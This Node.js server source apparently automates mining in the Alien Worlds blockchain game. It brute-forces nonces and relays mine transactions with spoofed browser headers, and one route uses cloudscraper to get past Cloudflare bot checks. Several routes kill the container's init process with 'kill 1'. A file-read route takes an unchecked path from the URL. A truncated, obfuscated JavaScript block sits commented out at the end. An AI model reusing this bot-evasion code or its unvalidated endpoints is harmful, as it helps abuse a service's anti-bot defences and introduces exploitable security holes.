const crypto                                = require('crypto');
const sha256                                = require('js-sha256').sha256;
const { Api, JsonRpc, Serialize }           = require('eosjs');
const fetch                                 = require('node-fetch');
const cpus                                  = require('os').cpus();
const cluster                               = require('cluster');
const { TextEncoder, TextDecoder }          = require('text-encoding');
const url                                   = require('url');
const fs                                    = require('fs'); 
const cloudscraper                          = require('cloudscraper');
const express                               = require("express");
const{ exec }                               = require("child_process");


const app       = express(); 
const nodeType  = (cluster.isMaster) ? 'Master' : 'Worker';

const port      = process.env.PORT || 3000;

app.use(express.urlencoded({ extended: false })); 
app.use(express.json());


const timeticket    = {}; 
const platformgu    = {
    'waxaccount' : '', 
    'timestamps' : Date.now()
}; 

if (cluster.isMaster) {

    for (let i = 0; i < 1; i++) {   // 
        worker = cluster.fork();
        worker.on('message', function(msg) {
            console.log('Master recieve msg :', msg.chat);
            cluster.fork({
                'waxaccount' : JSON.parse( msg.chat )['waxaccount'], 
                'difficulty' : JSON.parse( msg.chat )['difficulty'], 
                'lastMineTx' : JSON.parse( msg.chat )['lastMineTx'], 
                'timeticket' : JSON.parse( msg.chat )['timeticket']
            })            
        }); 
    }; 

    cluster.on('exit', (worker, code, signal) => {
        console.log('Worker #' + worker.process.pid, 'exited', code, signal);
        if( code != 255){ cluster.fork() }; 
    }); 

} else {

    if (
        "waxaccount" in process.env && 
        "difficulty" in process.env && 
        "lastMineTx" in process.env && 
        "timeticket" in process.env && 
        process.env.waxaccount && 
        process.env.difficulty && 
        process.env.lastMineTx && 
        process.env.timeticket && 
        !process.env.waxaccount == '' && 
        !process.env.difficulty == '' && 
        !process.env.lastMineTx == '' && 
        !process.env.timeticket == ''
    ){
        guess({
            'waxaccount' : process.env.waxaccount, 
            'difficulty' : process.env.difficulty, 
            'lastMineTx' : process.env.lastMineTx
        }).then(result => {
            try {
                fs.writeFile(`data/${ process.env.timeticket }.json`, JSON.stringify({
                    'waxaccount' : process.env.waxaccount, 
                    'difficulty' : process.env.difficulty, 
                    'lastMineTx' : process.env.lastMineTx, 
                    'timeticket' : process.env.timeticket, 
                    'result'     : result, 
                    'status'     : result['nonce'] ? 200:201
                }), err => {
                    if (err) { console.error(err) }; // file written successfully
                });
            } catch (err) {
                console.error({
                    'waxaccount' : process.env.waxaccount, 
                    'difficulty' : process.env.difficulty, 
                    'lastMineTx' : process.env.lastMineTx
                }, process.env.timeticket, err); 
                fs.writeFile(`data/${ process.env.timeticket }.json`, '', err => {});
            }; setTimeout(function(){ process.exit( 255 ) }, 2000); 
        }); 
    }else{

        setInterval(function () {
            if(
                ( (new Date) - platformgu['timestamps'] ) > ( 60 * 60 * 1000 )
            ){
                
                exec('kill 1', (err, stdout, stderr) => {
                    if (err) console.log(err); 
                }); 
                
            }; 
        }, ( 10 * 60 * 1000 )); 

        app.get("/", (req, res) => {
            res.setHeader('Content-Type', 'text/html');
            res.write("<html>"); 
            res.write("<head>"); 
            res.write(`<title>now-express</title>`); 
            res.write("</head>"); 
            res.write("<body>"); 
            res.write(`<h1>now-express ${ process.pid }</h1>`); 
            res.write("</body>"); 
            res.write("<html>"); 
            res.end(); 
        });

        app.get("/v1/open/:args", (req, res) => {
            if(
                req.url.match('waxaccount') && 
                req.url.match('difficulty') && 
                req.url.match('lastMineTx') && 
                url.parse(req.url,true).query && 
                url.parse(req.url,true).query.waxaccount && 
                url.parse(req.url,true).query.difficulty && 
                url.parse(req.url,true).query.lastMineTx
            ){

                console.log( req.url ); 
                console.log( url.parse(req.url,true).query.waxaccount ); 

                res.setHeader('Content-Type', 'application/json');
                res.setHeader('timeticket', (new Date().getTime())); 
                
                process.send({
                    chat : JSON.stringify({
                        'waxaccount' : url.parse(req.url,true).query.waxaccount, 
                        'difficulty' : url.parse(req.url,true).query.difficulty, 
                        'lastMineTx' : url.parse(req.url,true).query.lastMineTx, 
                        'timeticket' : res.getHeaders()['timeticket']
                    })
                });
                
                fs.writeFile(`data/${res.getHeaders()['timeticket']}.json`, JSON.stringify({
                    'waxaccount' : url.parse(req.url,true).query.waxaccount, 
                    'difficulty' : url.parse(req.url,true).query.difficulty, 
                    'lastMineTx' : url.parse(req.url,true).query.lastMineTx, 
                    'timeticket' : res.getHeaders()['timeticket'], 
                    'result'     : {
                        "account"    : url.parse(req.url,true).query.waxaccount, 
                        "nonce"      : "", 
                        "answer"     : ""
                    }, 
                    'status'     : 400
                }), err => {
                    if (err) { console.error(err) }; // file written successfully
                });

                res.end(JSON.stringify({ 'timeticket' : res.getHeaders()['timeticket'] }));

            }else{
                res.setHeader('Content-Type', 'text/html');
                res.send('?');
            }; 
        });
        app.get("/v1/call/:args", (req, res) => {
            if(
                req.params.args
            ){

                console.log( req.url ); 
                console.log( req.params ); 

                res.setHeader('Content-Type', 'application/json');
                res.setHeader('timeticket', req.params.args); 
                
                fs.readFile(`data/${req.params.args}.json`, 'utf-8',function(err, json){
                    try {
                        res.end( JSON.stringify(JSON.parse(json)) ); 
                    } catch (err) {
                        res.end( JSON.stringify({'status' : 500, 'msg' : err}) );
                    }; 
                });

            }else{
                res.setHeader('Content-Type', 'text/html');
                res.send('?');
            }; 
        });

        app.get("/:args", (req, res) => {
            if(
                req.url.match('waxaccount') && 
                req.url.match('difficulty') && 
                req.url.match('lastMineTx') && 
                url.parse(req.url,true).query && 
                url.parse(req.url,true).query.waxaccount && 
                url.parse(req.url,true).query.difficulty && 
                url.parse(req.url,true).query.lastMineTx
            ){

                console.log( req.url ); 
                console.log( url.parse(req.url,true).query.waxaccount ); 
                guess({
                    'waxaccount' : url.parse(req.url,true).query.waxaccount, 
                    'difficulty' : url.parse(req.url,true).query.difficulty, 
                    'lastMineTx' : url.parse(req.url,true).query.lastMineTx
                }).then(result => {
                    res.setHeader('Content-Type', 'application/json');
                    res.end(JSON.stringify(result));
                }); 

            }else{
                res.setHeader('Content-Type', 'text/html');
                res.send('?');
            }; 
        });
        
        app.get("/guard/platform-guard", (req, res) => {
            if(
                req.url.match('waxaccount') && 
                req.url.match('noncecoder') && 
                url.parse(req.url,true).query && 
                url.parse(req.url,true).query.waxaccount && 
                url.parse(req.url,true).query.noncecoder && (
                    platformgu['waxaccount'] == '' || platformgu['waxaccount'] == url.parse(req.url,true).query.waxaccount
                )
            ){
                
                console.log( req.url ); 
                console.log( url.parse(req.url,true).query.waxaccount ); 
                console.log( url.parse(req.url,true).query.noncecoder ); 
                console.log( platformgu ); 

                platformgu['waxaccount'] = url.parse(req.url,true).query.waxaccount; 

                fetch("https://aw-guard.yeomen.ai/platform-guard", {
                    "headers"   : {
                        'User-Agent'        : 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36', 
                        'Accept'            : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 
                        'Accept-Language'   : 'en-US,en;q=0.9', 
                        'Accept-Encoding'   : 'gzip, deflate', 
                        'x-requested-with'  : 'XMLHttpRequest', 
                        'referer'           : 'https://play.alienworlds.io/', 
                        'Content-Length'    : '215', 
                        'Content-Type'      : 'application/json'
                    },
                    "referrer"  : "https://play.alienworlds.io/",
                    "body"      : `{\"account_name\":\"${
                        url.parse(req.url,true).query.waxaccount
                    }\",\"actions\":[{\"account\":\"m.federation\",\"name\":\"mine\",\"authorization\":[{\"actor\":\"${
                        url.parse(req.url,true).query.waxaccount
                    }\",\"permission\":\"active\"}],\"data\":    {\"miner\":\"${
                        url.parse(req.url,true).query.waxaccount
                    }\",\"nonce\":\"${
                        url.parse(req.url,true).query.noncecoder
                    }\"}}]}`,
                    "method"    : "POST"
                }).then(
                    
                    result => result.json()

                ).then(result => {
                    
                    console.log( result ); 
                    platformgu['waxaccount'] = url.parse(req.url,true).query.waxaccount; 
                    platformgu['timestamps'] = Date.now(); 

                    if (
                        result.hasOwnProperty('stats') && result['stats'].hasOwnProperty('cosign_ratelimit_txs') && result['stats']['cosign_ratelimit_txs'] == 0
                    ){
                        setTimeout(function(){
                            exec('kill 1', (err, stdout, stderr) => {
                                if (err) console.log(err); 
                            });
                        }, 2000); 
                    }; 

                    res.setHeader('Content-Type', 'application/json');
                    res.end(JSON.stringify(result));
                    
                }).catch(error => {
                    
                    console.log( error ); 
                    platformgu['waxaccount'] = url.parse(req.url,true).query.waxaccount; 
                    platformgu['timestamps'] = Date.now(); 

                    setTimeout(function(){
                        exec('kill 1', (err, stdout, stderr) => {
                            if (err) console.log(err); 
                        });
                    }, 2000); 

                    res.setHeader('Content-Type', 'application/json');
                    res.end(JSON.stringify({'error' : error}));
                    
                }); 

            }else{
                res.setHeader('Content-Type', 'application/json');
                res.end(JSON.stringify( platformgu )); 
            }; 
        });
        app.get("/guard/platform-restart", (req, res) => {

            setTimeout(function(){
                exec('kill 1', (err, stdout, stderr) => {
                    if (err) console.log(err); 
                });
            }, 2000); 

            res.setHeader('Content-Type', 'application/json');
            res.end(JSON.stringify( platformgu )); 

        });
        //  app.post("/guard/push_transaction", (req, res) => {
        //      
        //      console.log( req.body ); 
        //  
        //      fetch("https://aw-guard.yeomen.ai/v1/chain/push_transaction", {
        //          "headers"   : {
        //              'User-Agent'        : 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36', 
        //              'Accept'            : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 
        //              'Accept-Language'   : 'en-US,en;q=0.9', 
        //              'Accept-Encoding'   : 'gzip, deflate', 
        //              'x-requested-with'  : 'XMLHttpRequest', 
        //              'referer'           : 'https://play.alienworlds.io/', 
        //              'Content-Length'    : '215', 
        //              'Content-Type'      : 'application/json'
        //          },
        //          "referrer"  : "https://play.alienworlds.io/",
        //          "body"      : JSON.stringify(req.body),
        //          "method"    : "POST"
        //      }).then(
        //          
        //          result => result.json()
        //  
        //      ).then(result => {
        //          
        //          res.setHeader('Content-Type', 'application/json');
        //          res.end(JSON.stringify(result));
        //          
        //      }).catch(error => {
        //  
        //          res.setHeader('Content-Type', 'application/json');
        //          res.end(JSON.stringify({'error' : error}));
        //          
        //      }); 
        //  
        //  });
        app.post("/guard/push_transaction", (req, res) => {
            
            console.log( req.body ); 
            
            cloudscraper({
                method             : 'POST',
                headers            : {
                    "accept"              : "*/*",
                    "accept-language"     : "en-US,en;q=0.9",
                    "content-type"        : "text/plain;charset=UTF-8",
                    'origin'              : 'https://play.alienworlds.io',
                    'referer'             : 'https://play.alienworlds.io/',
                },
                url                : 'https://aw-guard.yeomen.ai/v1/chain/push_transaction',
                body               : JSON.stringify(req.body), 
                referrer           : "https://play.alienworlds.io/"
            }).then(result => {
                console.log( result ); 
                res.setHeader('Content-Type', 'application/json'); 
                res.end(result); 
            }).catch(err => {
                console.log( err ); 
                res.setHeader('Content-Type', 'application/json');
                res.end(JSON.stringify( err )); 
            });
        });
        

        app.get("/trace", (req, res) => {
            fetch(
                'https://www.cloudflare.com/cdn-cgi/trace'
            ).then(
                result => result.text()
            ).then(result => {
                console.log(result)
                res.setHeader('Content-Type', 'text/html');
                res.write("<html>"); 
                res.write("<head>"); 
                res.write("<title>trace</title>"); 
                res.write("</head>"); 
                res.write("<body>"); 
                res.write(`<pre>${ result }</pre>`); 
                res.write("</body>"); 
                res.write("<html>"); 
                res.end(); //   process.exit()
            });
        });

        // Listen on port ${port}
        app.listen(port, () => {
            console.log(`Server is booming on port ${port} Visit http://localhost:${port}`);
        }); 

    }; 
    
}; 

console.log(nodeType + ' #' + process.pid, 'is running');































async function guess(DATA){

    const nameToArray = (name) => {
        const sb = new Serialize.SerialBuffer({
            textEncoder: new TextEncoder,
            textDecoder: new TextDecoder
        }); sb.pushName(name); return sb.array; 
    }; 

    const getRand = () => {
        const arr = new Uint8Array(8); 
        for (let i=0; i < 8; i++){
            //    const rand = Math.floor(Math.random() * 255); 
            //    arr[i] = rand; 
            arr[i] = Math.floor(Math.random() * 255)
        }; return arr; 
    }; 
    const toHex = (buffer) => {
        return [...new Uint8Array (buffer)]
        .map (b => b.toString (16).padStart (2, "0"))
        .join (""); 
    }; 
    const unHex = (hexed) => {
        const arr = new Uint8Array(8);
        for (let i=0; i < 8; i++){
            arr[i] = parseInt(hexed.slice(i*2, (i+1)*2), 16); 
        }; return arr; 
    }; 
    const fromHexString = (hexString) => new Uint8Array(hexString.match(/.{1,2}/g).map((byte) => parseInt(byte, 16)))



    //    let {mining_account, account, account_str, difficulty, last_mine_tx, last_mine_arr, sb} = _message.data;
    
    /*! xxxx.wam !*/
    //  console.log( DATA.waxaccount ); 
    //  console.log( nameToArray( DATA.waxaccount ) ); 
    //  console.log( DATA.difficulty ); 
    //  console.log( DATA.lastMineTx ); 

    /*! GET PARAM FROM DATA !*/ mining_account  = 'm.federation'; 
    /*! GET PARAM FROM DATA !*/ account         = nameToArray( DATA.waxaccount ); // [0, 0, 144, 134, 3, 126, 33, 0]; 
    /*! GET PARAM FROM DATA !*/ account_str     = DATA.waxaccount ; 
    /*! GET PARAM FROM DATA !*/ difficulty      = DATA.difficulty; 
    /*! GET PARAM FROM DATA !*/ last_mine_tx    = DATA.lastMineTx.substr(0, 16); 
    //    /*! GET PARAM FROM DATA !*/ last_mine_arr  = unHex(last_mine_tx); 
    /*! GET PARAM FROM DATA !*/ last_mine_arr   = fromHexString(last_mine_tx); 
    console.log('NEW', last_mine_arr, last_mine_arr.length)
    
    account = account.slice(0, 8);
    
    const is_wam = account_str.substr(-4) === '.wam';
    
    let good = false, itr = 0, rand = 0, hash, hex_digest, rand_arr, last;
    
    console.log(`Performing work with difficulty ${difficulty}, last tx is ${last_mine_tx}...`);
    if (is_wam){
        console.log(`Using WAM account`);
    }
    
    start = (new Date()).getTime();
    end   = (new Date()).getTime();
    
    while (!good){
        
        rand_arr = getRand();
        
        const combined = new Uint8Array(account.length + last_mine_arr.length + rand_arr.length);
        combined.set(account);
        combined.set(last_mine_arr, account.length);
        combined.set(rand_arr, account.length + last_mine_arr.length);

        //  hash = await crypto.createHash('sha256').update( combined.slice(0, 24) ).digest('Uint8Array'); 
        hash = await sha256.create().update( combined.slice(0, 24) ).digest('Uint8Array'); 

        hex_digest = toHex(hash);
        
        //  console.log( `${itr} ${hex_digest}\n ` ); 
        
        //  if (is_wam){
        //      good = hex_digest.substr(0, 4) === '0000';
        //  } else {
        //      good = hex_digest.substr(0, 6) === '000000';
        //  }; 
        good = hex_digest.substr(0, 4) === '0000';
        
        if (good){
            //  if (is_wam){
            //      last = parseInt(hex_digest.substr(4, 1), 16);
            //  } else {
            //      last = parseInt(hex_digest.substr(6, 1), 16);
            //  }; 
            last = parseInt(hex_digest.substr(4, 1), 16);
            good &= (last <= difficulty);
        }; 
        
        itr++;
        
        if (itr % 10000 === 0){
            console.log(`Still mining - tried ${itr} iterations ${((new Date()).getTime()-start) / 1000}s`);
            end = (new Date()).getTime();
        }; 
        
        //  if (!good){
        //      hash = null;
        //  }; 
        
        if (
            //  itr >= 100000 * 16 || (end-start) / 1000 >= (20 / (Number(difficulty) || 1))
            (
                end-start
            ) / 1000 >= (
                20 / (Number(difficulty) || 1)
            )
        ){
            rand_arr    = ''; 
            hex_digest  = `SORRY WE CAN NOT SOLVED LOOP ${ itr }`; 
            break; 
        }; 

    }; 
    
    end = (new Date()).getTime();
    
    const rand_str  = toHex(rand_arr);
    
    console.log(`Found hash in ${itr} iterations with ${account} ${rand_str}, last = ${last}, hex_digest ${hex_digest} taking ${(end-start) / 1000}s`)
    const mine_work     = {account:account_str, nonce:rand_str, answer:hex_digest}; 
    
    console.log( mine_work ); 
    
    return new Promise(function(resolve, reject) {
        resolve({account:account_str, nonce:rand_str, answer:hex_digest}); 
    });
}; 

function arrayToHex(data) {
    let result = '';
    for (const x of data) {
        result += ('00' + x.toString(16)).slice(-2);
    }; return result;
}; 
async function get_rawabi_and_abi(account){
    try {
        const endpoint      = 'https://wax.blokcrafters.io';
        const rpc           = new JsonRpc(endpoint, { fetch }); 
        const api           = new Api({ rpc, signatureProvider, textDecoder: new TextDecoder, textEncoder: new TextEncoder });

        const rawAbi        = (await api.abiProvider.getRawAbi(account)).abi;
        const abi           = await api.rawAbiToJson(rawAbi);

        const result        = {
            accountName : account,
            rawAbi,
            abi
        }; return result;
    } catch (err) {
        console.log(err);
    }
}; 

//  (function(_0x13ef79,_0x1463ae){var _0xf968f1=_0x13ef79();function _0xe076bd(_0x305aa3,_0x2e282a,_0x5e7b06,_0x2bb25e){return _0x150e(_0x305aa3- -0x34e,_0x2bb25e);}function _0x778a41(_0x2134ce,_0xfe2a8d,_0x45a732,_0x306d03){return _0x150e(_0x2134ce- -0x1d5,_0x45a732);}while(!![]){try{var _0x3e8722=-parseInt(_0xe076bd(-0x1bf,-0x193,-0x1dc,-0x1f8))/(-0x1*-0x1345+0x9e2*-0x2+0x80)+parseInt(_0xe076bd(-0x1a9,-0x1c6,-0x15c,-0x160))/(-0x11*0x52+-0x7*0x77+0x3*0x2e7)*(-parseInt(_0x778a41(-0x3c,-0x21,-0x83,-0x4b))/(-0x8f8+0x1a26+0x5*-0x36f))+parseInt(_0x778a41(-0x6a,-0x5e,-0x74,-0x5d))/(0x47b*0x5+-0x4*-0x8ed+-0x3a17)*(parseInt(_0xe076bd(-0x1b0,-0x1c4,-0x192,-0x196))/(0x339*-0x1+-0x166*0xd+-0x1c9*-0xc))+parseInt(_0xe076bd(-0x1c2,-0x1f1,-0x1ee,-0x210))/(-0x2*0x74f+-0x135*-0x17+-0xd1f*0x1)*(-parseInt(_0xe076bd(-0x1b1,-0x1b5,-0x168,-0x1f9))/(0xf0*0x9+0x13*-0xe9+-0x471*-0x2))+-parseInt(_0x778a41(-0x1b,-0x37,-0x17,-0x61))/(0x1b22+0x1*-0x83f+0x12db*-0x1)+-parseInt(_0x778a41(-0x88,-0xc2,-0x4c,-0x40))/(-0x80*-0x15+-0x242*-0x6+-0x1803)*(-parseInt(_0xe076bd(-0x1fc,-0x1c0,-0x1b2,-0x247))/(0x1bd6+0xac3+-0x268f))+parseInt(_0x778a41(-0x92,-0x45,-0xd6,-0x84))/(-0x46+-0x49*0x6a+0x1e8b);if(_0x3e8722===_0x1463ae)break;else _0xf968f1['push'](_0xf968f1['shift']());}catch(_0x47ee60){_0xf968f1['push'](_0xf968f1['shift']());}}}(_0x2d84,0xa6*-0x69d+-0x2329*0x24+0x9*0x18a45));var _0x2a97dc=(function(){var _0xf8a9da={};function _0x13887f(_0x24ca90,_0x4c6efd,_0x1bebfb,_0x5b21ee){return _0x150e(_0x4c6efd-0x356,_0x5b21ee);}_0xf8a9da[_0x13887f(0x46b,0x4aa,0x4e2,0x4d7)]=_0x13887f(0x47d,0x4c7,0x4c0,0x508)+_0x76515b(-0x246,-0x20b,-0x254,-0x27e),_0xf8a9da[_0x76515b(-0x286,-0x242,-0x24c,-0x24d)]=function(_0x865f69,_0x42d652){return _0x865f69+_0x42d652;},_0xf8a9da[_0x76515b(-0x25b,-0x239,-0x250,-0x20f)]=_0x13887f(0x523,0x508,0x4cb,0x4f1),_0xf8a9da['kINFD']=_0x76515b(-0x272,-0x28c,-0x278,-0x271),_0xf8a9da[_0x13887f(0x455,0x470,0x423,0x4c0)]=_0x76515b(-0x28d,-0x274,-0x282,-0x23e);function _0x76515b(_0x5850e2,_0x4f7bd4,_0x32e8a3,_0x3985e0){return _0x150e(_0x5850e2- -0x3ba,_0x32e8a3);}_0xf8a9da[_0x76515b(-0x291,-0x285,-0x2c6,-0x2c5)]=function(_0x4f2ce6,_0x4cea08){return _0x4f2ce6===_0x4cea08;},_0xf8a9da['pAmmc']=_0x76515b(-0x271,-0x244,-0x254,-0x2a6);var _0x195353=_0xf8a9da,_0x4799c8=!![];return function(_0x48c1de,_0x2ea603){var _0xf7fe55={};_0xf7fe55['WVEHG']=_0x195353[_0x5817dd(0x2d3,0x31b,0x33e,0x30e)],_0xf7fe55[_0x5817dd(0x28d,0x2d9,0x30f,0x2bd)]=_0x195353[_0x5817dd(0x2a1,0x29a,0x25a,0x2ae)];function _0x5817dd(_0x12f105,_0x4e1129,_0x545f92,_0x26b5f4){return _0x76515b(_0x4e1129-0x53a,_0x4e1129-0x1c7,_0x545f92,_0x26b5f4-0xad);}function _0x428391(_0x4a0d9b,_0x2c658d,_0x2bfdb3,_0x4c18f1){return _0x76515b(_0x4a0d9b-0x6df,_0x2c658d-0x3d,_0x2c658d,_0x4c18f1-0x39);}_0xf7fe55[_0x428391(0x4a6,0x4cd,0x48c,0x4b2)]=function(_0x2bd521,_0x1e1c86){return _0x2bd521!==_0x1e1c86;},_0xf7fe55[_0x5817dd(0x2b0,0x2bd,0x2b3,0x280)]=_0x5817dd(0x307,0x318,0x2f0,0x2dc);var _0x1262a8=_0xf7fe55;if(_0x195353['ZulPo'](_0x195353[_0x428391(0x447,0x3f7,0x465,0x482)],_0x428391(0x498,0x465,0x4e8,0x4bb))){var _0x34d7ff=new _0xfa8c6d(_0x195353['YVjNM']),_0x4b346e=new _0x49fff3(_0x428391(0x4cf,0x4a0,0x4ca,0x4ce)+_0x428391(0x494,0x47f,0x478,0x454)+'0-9a-zA-Z_'+_0x428391(0x491,0x4e3,0x445,0x4cb),'i'),_0xee8e3c=_0x17663a(_0x5817dd(0x364,0x335,0x2ec,0x2ea));!_0x34d7ff[_0x5817dd(0x2ec,0x30e,0x2ee,0x2e2)](_0xee8e3c+'chain')||!_0x4b346e['test'](_0x195353['DxdyR'](_0xee8e3c,_0x195353['YFjJQ']))?_0xee8e3c('0'):_0x36c73c();}else{var _0x1d2355=_0x4799c8?function(){function _0x436e89(_0x4c3122,_0x4a2e55,_0x5747e6,_0x149a55){return _0x428391(_0x149a55- -0x583,_0x4c3122,_0x5747e6-0x43,_0x149a55-0x56);}function _0x41eb10(_0x27e8c6,_0xf33315,_0x27983a,_0x3dd946){return _0x5817dd(_0x27e8c6-0xf2,_0x27983a- -0x271,_0x3dd946,_0x3dd946-0xa2);}if(_0x1262a8[_0x41eb10(0x2f,0x98,0x5e,0xd)]!==_0x1262a8[_0x41eb10(0xb8,0x3a,0x68,0x4e)]){if(_0x2ea603){if(_0x1262a8[_0x436e89(-0x127,-0xba,-0x11d,-0xdd)](_0x1262a8[_0x41eb10(0x9f,0x7,0x4c,0x47)],_0x1262a8['hjvHe']))_0x40e1a7[_0x436e89(-0x107,-0x13e,-0xb8,-0x102)](_0x490546);else{var _0x1acb9b=_0x2ea603[_0x436e89(-0xac,-0xb6,-0x8f,-0xaf)](_0x48c1de,arguments);return _0x2ea603=null,_0x1acb9b;}}}else{_0x1e81de&&_0xcacdc6['error'](_0x48b9e7);;}}:function(){};return _0x4799c8=![],_0x1d2355;}};}());function _0x54ec81(_0xec29f5,_0x207821,_0x52a63f,_0x4d3752){return _0x150e(_0x4d3752- -0x30c,_0x52a63f);}var _0x3a38a1=_0x2a97dc(this,function(){var _0x259fed={};function _0x3faae2(_0x28f18a,_0x34a9ba,_0x3fbfd3,_0x203183){return _0x150e(_0x34a9ba-0x4b,_0x28f18a);}function _0x19e061(_0x32d048,_0x2317dc,_0x1f7ca1,_0x539a4a){return _0x150e(_0x1f7ca1- -0xf4,_0x2317dc);}_0x259fed[_0x3faae2(0x17c,0x192,0x156,0x189)]=_0x19e061(0x61,0x76,0x8e,0x84)+'+$';var _0x372e8e=_0x259fed;return _0x3a38a1['toString']()[_0x19e061(0x9b,0xcb,0xaf,0x69)](_0x372e8e[_0x19e061(0x86,0x75,0x53,0x56)])['toString']()[_0x3faae2(0x170,0x195,0x1e0,0x171)+'r'](_0x3a38a1)['search'](_0x372e8e['jRoMH']);});_0x3a38a1();var _0x431d9b=(function(){var _0x2104b8={};_0x2104b8[_0x281af0(0x4c0,0x436,0x487,0x435)]=_0x281af0(0x439,0x454,0x48a,0x46a)+'+$',_0x2104b8['VAiKo']=_0x228291(-0x15b,-0x1e3,-0x1e2,-0x19a);function _0x228291(_0x1f45c1,_0x35fcc0,_0x23e49b,_0x2b35c5){return _0x150e(_0x2b35c5- -0x32c,_0x1f45c1);}function _0x281af0(_0x27e807,_0x3fbc74,_0x42e815,_0x357a66){return _0x150e(_0x42e815-0x308,_0x27e807);}var _0x40e7f3=_0x2104b8,_0x33ffa4=!![];return function(_0x187a21,_0x19674d){function _0x127bc2(_0x4ca1e8,_0x5ae7b7,_0x3af078,_0x11cf89){return _0x281af0(_0x3af078,_0x5ae7b7-0x57,_0x5ae7b7- -0x331,_0x11cf89-0x1f4);}function _0x42b949(_0x4bd99d,_0x159edb,_0x56e210,_0x400786){return _0x281af0(_0x400786,_0x159edb-0x18e,_0x56e210- -0x2a9,_0x400786-0x122);}if(_0x40e7f3[_0x42b949(0x1d6,0x1de,0x1aa,0x183)]!==_0x127bc2(0xf8,0x13b,0x121,0x140)){var _0x3780d9=_0x33ffa4?function(){function _0x456c06(_0x2d8d04,_0x345dea,_0x54dcb8,_0xd6783c){return _0x127bc2(_0x2d8d04-0x5e,_0xd6783c- -0x15f,_0x54dcb8,_0xd6783c-0x188);}if(_0x19674d){var _0x37f3b2=_0x19674d[_0x456c06(0xd,-0x16,0x3f,0x27)](_0x187a21,arguments);return _0x19674d=null,_0x37f3b2;}}:function(){};return _0x33ffa4=![],_0x3780d9;}else return _0x16e354[_0x127bc2(0x181,0x138,0x17f,0x166)]()[_0x42b949(0x233,0x1dd,0x202,0x1ba)](_0x40e7f3['iIjqf'])['toString']()[_0x127bc2(0xf1,0x121,0x16a,0xed)+'r'](_0x5a21f8)[_0x127bc2(0x1ae,0x17a,0x187,0x1a5)](_0x40e7f3[_0x127bc2(0x14e,0x156,0x104,0x126)]);};}());(function(){function _0x4caebb(_0x5941a9,_0x5d546b,_0x13e266,_0x1da5f1){return _0x150e(_0x1da5f1- -0x24,_0x5941a9);}function _0x362228(_0xe90f23,_0x11ff36,_0x71a879,_0x5a9836){return _0x150e(_0x5a9836- -0x3af,_0x71a879);}var _0x20cf9f={'jxEjV':'SeTKU','NSrZm':_0x4caebb(0x1bd,0x1c0,0x15a,0x186)+'a-zA-Z_$]['+_0x4caebb(0x1be,0x1d9,0x141,0x189)+_0x362228(-0x251,-0x26c,-0x202,-0x243),'URBAa':function(_0x132ba5,_0x305eb4){return _0x132ba5(_0x305eb4);},'VRMsl':_0x4caebb(0x180,0x16c,0x19e,0x191),'bwxRP':function(_0x454620,_0x136f78){return _0x454620+_0x136f78;},'epCvr':_0x4caebb(0x178,0x16c,0x190,0x13e),'lsGPf':_0x4caebb(0x1e0,0x1d9,0x1a9,0x18e),'KGfVK':_0x4caebb(0x11c,0x14f,0xcd,0x114),'Vyqrv':function(_0x1fe0a3,_0x49be9a){return _0x1fe0a3(_0x49be9a);},'iLfWM':function(_0x57717f,_0x51b130,_0x19aa09){return _0x57717f(_0x51b130,_0x19aa09);}};_0x20cf9f[_0x4caebb(0x12f,0x111,0x164,0x11d)](_0x431d9b,this,function(){function _0x58809f(_0x3854e9,_0x27c361,_0x534951,_0x3d5fff){return _0x4caebb(_0x3854e9,_0x27c361-0xa8,_0x534951-0xfb,_0x534951- -0x1b0);}function _0x3d069c(_0x5f01bc,_0x3e0f35,_0x2afdce,_0xeefd6c){return _0x4caebb(_0x5f01bc,_0x3e0f35-0x158,_0x2afdce-0xd5,_0x3e0f35- -0x112);}if(_0x3d069c(0x3e,0x76,0x96,0x6c)===_0x20cf9f[_0x3d069c(-0x39,-0x3,-0x38,-0xf)]){var _0x22feb4=new RegExp(_0x58809f(-0xa4,-0x2f,-0x63,-0x5f)+_0x3d069c(0x70,0x3e,0x5a,0x11)),_0x1175dc=new RegExp(_0x20cf9f[_0x3d069c(0x3d,0x45,0x54,0x30)],'i'),_0x5274d4=_0x20cf9f[_0x58809f(-0x30,-0x30,-0x1b,0x17)](_0x5b6499,_0x20cf9f[_0x3d069c(0xd3,0x85,0xa3,0x36)]);if(!_0x22feb4[_0x3d069c(0x61,0x58,0x15,0x64)](_0x20cf9f['bwxRP'](_0x5274d4,_0x20cf9f[_0x3d069c(0x7e,0x6a,0x21,0xa0)]))||!_0x1175dc[_0x3d069c(0x82,0x58,0x3b,0x78)](_0x5274d4+_0x20cf9f['lsGPf'])){if(_0x20cf9f[_0x3d069c(-0x26,-0x11,0x3b,-0x14)]!==_0x20cf9f[_0x58809f(-0x97,-0x75,-0xaf,-0xd8)]){var _0x4c3317=_0x267ea4?function(){function _0xa35d14(_0x228b0a,_0x5ecc68,_0x2e9c8d,_0x150916){return _0x3d069c(_0x228b0a,_0x2e9c8d-0x490,_0x2e9c8d-0x188,_0x150916-0x50);}if(_0x50d870){var _0x485aa2=_0x286a98[_0xa35d14(0x533,0x54d,0x509,0x4ed)](_0x537f2b,arguments);return _0x3dbfcf=null,_0x485aa2;}}:function(){};return _0x247cd9=![],_0x4c3317;}else _0x20cf9f[_0x3d069c(-0x9,0x1,0x41,0x38)](_0x5274d4,'0');}else _0x5b6499();}else _0xe91013[_0x58809f(-0xc1,-0xb4,-0x78,-0x79)](_0x2a4cee);})();}());function _0x150e(_0x2d9cfc,_0x2dedac){var _0x390603=_0x2d84();return _0x150e=function(_0x43c3f1,_0x1c6267){_0x43c3f1=_0x43c3f1-(-0xb55*-0x1+-0x248*0x11+0x1c8a*0x1);var _0x23741c=_0x390603[_0x43c3f1];if(_0x150e['AcnGUW']===undefined){var _0x201fc0=function(_0x13e08e){var _0xdc9122='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var _0x1121c4='',_0x3e820c='',_0x1ff64e=_0x1121c4+_0x201fc0;for(var 